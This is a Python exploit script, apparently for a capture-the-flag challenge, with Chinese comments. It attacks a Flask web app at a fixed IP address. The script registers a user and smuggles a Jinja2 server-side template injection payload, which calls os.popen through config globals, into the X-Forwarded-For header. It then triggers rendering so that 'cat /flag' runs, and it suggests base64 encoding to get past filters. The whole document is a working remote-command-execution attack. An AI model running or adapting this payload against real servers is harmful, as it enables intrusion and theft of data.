import requests
import re
import time
import random
import urllib.parse
from flask import Flask, request

# 创建临时 Flask 应用用于生成伪造请求
app = Flask(__name__)

TARGET = "http://61.147.171.105:50366"
USERNAME = f"ssti_{random.randint(10000, 99999)}"
PASSWORD = "123456"
FLAG_CMD = "cat /flag"  # 根据实际环境调整

sess = requests.Session()


# 生成双重编码的 SSTI payload
def generate_payload(cmd):
    # 双重花括号绕过第一次渲染
    payload = f"{{{{'{{'}}config.__class__.__init__.__globals__['os'].popen('{cmd}').read(){{'}}'}}}}"
    # URL 编码确保安全传输
    return urllib.parse.quote(payload)


# 生成伪造的本地请求
def generate_local_request(url, cookie):
    with app.test_request_context(path=url, headers={'Cookie': f'session={cookie}'}):
        return request


print(f"[*] 创建用户: {USERNAME}")

# 注册用户
register_data = {
    "username": USERNAME,
    "password": PASSWORD,
    "bio": 'hacker'
}
register_resp = sess.post(
    f"{TARGET}/register",
    data=register_data
)
print(f"注册响应: {register_resp.status_code}")

# 登录获取有效 session
print(f"[*] 用户登录")
login_resp = sess.post(
    f"{TARGET}/login",
    data={"username": USERNAME, "password": PASSWORD}
)
session_cookie = sess.cookies.get('session')
print(f"登录响应: {login_resp.status_code}, Session: {session_cookie}")

# 生成恶意请求
print(f"[*] 生成恶意请求")
malicious_payload = generate_payload(FLAG_CMD)
fake_request = generate_local_request(
    f"/get_last_ip/{USERNAME}",
    session_cookie
)

# 设置带 payload 的 X-Forwarded-For
headers = {
    "X-Forwarded-For": malicious_payload,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "X-Real-IP": fake_request.remote_addr,
    "X-Forwarded-Proto": fake_request.scheme,
    "Host": fake_request.host
}

# 更新 last_ip
print(f"[*] 设置恶意 last_ip")
update_resp = sess.get(
    f"{TARGET}/profile",  # 触发 after_request 更新 last_ip
    headers=headers
)
print(f"更新 last_ip 响应: {update_resp.status_code}")

# 等待更新生效
print("[*] 等待服务器更新 last_ip (3秒)")
time.sleep(3)

# 触发 SSTI
print(f"[*] 触发 SSTI 漏洞")
exploit_resp = sess.get(
    f"{TARGET}/ip_detail/{USERNAME}",
    headers={"Cookie": f"session={session_cookie}"}
)

print("[*] 响应状态:", exploit_resp.status_code)
print("[*] 响应内容:")
print(exploit_resp.text[:1000] + "..." if len(exploit_resp.text) > 1000 else exploit_resp.text)

# 提取 flag
flags = re.findall(r"flag\{[^}]*\}", exploit_resp.text)
if flags:
    print(f"\n[+] 成功获取 FLAG: {flags[0]}")
else:
    print("\n[-] 未找到 FLAG, 可能原因:")
    print("1. 文件路径不正确 (尝试 '/flag.txt' 或 '/home/ctf/flag')")
    print("2. 特殊字符被过滤 (尝试 base64 编码命令)")
    print("3. 服务器配置阻止命令执行")

    # 测试性 payload
    test_payload = generate_payload("echo test")
    print(f"[!] 测试 payload: {test_payload}")